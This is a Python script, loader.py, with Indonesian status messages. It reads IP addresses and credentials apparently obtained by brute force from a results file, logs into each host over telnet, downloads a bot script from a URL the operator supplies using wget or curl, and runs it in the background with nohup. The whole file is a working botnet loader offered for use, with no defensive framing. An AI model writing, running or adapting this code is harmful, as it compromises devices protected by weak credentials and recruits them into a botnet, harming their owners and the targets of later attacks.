# loader.py
import telnetlib
import time
import os

def inject_bot(ip, user, passwd, bot_script_url):
    try:
        print(f"[LOADER] Menyambung ke {ip} sebagai {user}/{passwd}")
        tn = telnetlib.Telnet(ip, 23, timeout=5)
        tn.read_until(b"login:")
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"Password:")
        tn.write(passwd.encode('ascii') + b"\n")

        index, match, output = tn.expect([b"#", b">", b"$"], timeout=3)
        if index < 0:
            print(f"[!] Gagal shell akses ke {ip}")
            return False

        commands = [
            f"wget {bot_script_url} -O /tmp/bot.py || curl -o /tmp/bot.py {bot_script_url}",
            "chmod +x /tmp/bot.py",
            "nohup python3 /tmp/bot.py &"
        ]

        for cmd in commands:
            tn.write(cmd.encode('ascii') + b"\n")
            time.sleep(1)

        tn.write(b"exit\n")
        print(f"[✓] Bot berhasil dikirim ke {ip}")
        return True

    except Exception as e:
        print(f"[X] Error saat kirim ke {ip}: {e}")
        return False

def run_loader():
    if not os.path.exists("brute_results.txt"):
        print("[!] File brute_results.txt tidak ditemukan.")
        return

    with open("brute_results.txt", "r") as f:
        lines = f.read().splitlines()

    brute_results = []
    for line in lines:
        try:
            ip, user, passwd = line.split("|")
            brute_results.append((ip, user, passwd))
        except:
            continue

    if not brute_results:
        print("[!] Tidak ada data valid di brute_results.txt")
        return

    bot_script_url = input("[URL] Masukkan link bot script (misal: http://yourhost/bot.py): ").strip()

    for ip, user, passwd in brute_results:
        inject_bot(ip, user, passwd, bot_script_url)

    print("[✓] Semua bot berhasil dikirim.")
